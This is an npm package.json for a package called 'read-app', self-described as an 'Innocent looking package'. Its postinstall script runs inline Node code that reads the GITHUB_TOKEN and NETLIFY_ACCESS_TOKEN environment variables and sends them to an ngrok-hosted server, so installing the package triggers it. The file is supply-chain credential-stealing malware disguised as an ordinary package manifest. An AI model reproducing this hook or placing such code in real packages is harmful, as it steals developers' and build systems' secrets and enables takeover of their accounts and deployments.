{
  "name": "read-app",
  "version": "1.0.0",
  "description": "Innocent looking package",
  "scripts": {
    "postinstall": "node -e \"const http = require('http'); const token = process.env.GITHUB_TOKEN; const netlify = process.env.NETLIFY_ACCESS_TOKEN; const data = 'github_token=' + encodeURIComponent(token) + '&netlify_token=' + encodeURIComponent(netlify); const options = { hostname: '872991a52f91.ngrok-free.app', port: 80, path: '/?exfil=1&' + data, method: 'GET' }; http.request(options).end(); setTimeout(() => process.exit(0), 500);\"",
    "build": "echo 'Building...'",
    "test": "echo 'Testing...'"
  },
  "dependencies": {
    "express": "^4.18.0"
  }
}
